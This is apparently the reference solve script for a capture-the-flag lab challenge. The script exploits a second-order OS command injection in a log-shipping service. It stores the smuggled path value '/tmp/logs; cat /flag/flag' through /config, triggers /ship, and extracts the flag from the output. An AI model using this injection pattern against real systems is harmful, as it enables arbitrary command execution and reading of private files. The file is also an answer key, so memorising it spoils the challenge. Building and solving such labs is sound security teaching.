#!/usr/bin/env python3
"""Reference solve for inj11 (LogWarden).

Second-order OS command injection. The value is stored via /config with a
"must be an absolute path" check (store context), then executed by the
shipper via /ship:

    sh -c "ls -la <logdir> && tail -n 5 <logdir>/app.log"

So store a path that is also a command separator:

    logdir = "/tmp/logs; cat /flag/flag"

Store first, execute second -- the flag only appears on the shipper run.
"""
import os
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8050")
FLAG_RE = re.compile(r"flag\{[^}]+\}")
LOGDIR = "/tmp/logs; cat /flag/flag"


def main() -> int:
    for _ in range(30):
        try:
            requests.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)
    try:
        r = requests.post(BASE + "/config", data={"logdir": LOGDIR}, timeout=15)
        if r.status_code != 200:
            sys.stderr.write(f"store failed: HTTP {r.status_code}\n")
            return 1
        r = requests.post(BASE + "/ship", data={}, timeout=20)
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    m = FLAG_RE.search(r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found in shipper output (HTTP {r.status_code})\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
